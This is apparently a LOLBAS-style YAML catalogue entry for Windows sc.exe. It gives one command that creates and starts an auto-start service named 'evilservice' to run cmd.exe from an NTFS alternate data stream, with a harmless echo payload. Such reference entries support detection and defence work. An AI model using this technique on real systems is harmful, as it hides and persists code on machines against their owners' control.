---
name: sc.exe
description: Used in Windows to manipulate on services
functions:
  ads:
    - description: Creates a new service and executes the file stored in the ADS.
      code: sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice
resources: 
    - resource: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
fullpath: 
    - path: c:\windows\system32\sc.exe
    - path: c:\windows\sysWOW64\sc.exe
notes: Thanks to Oddvar Moe - @oddvarmoe
---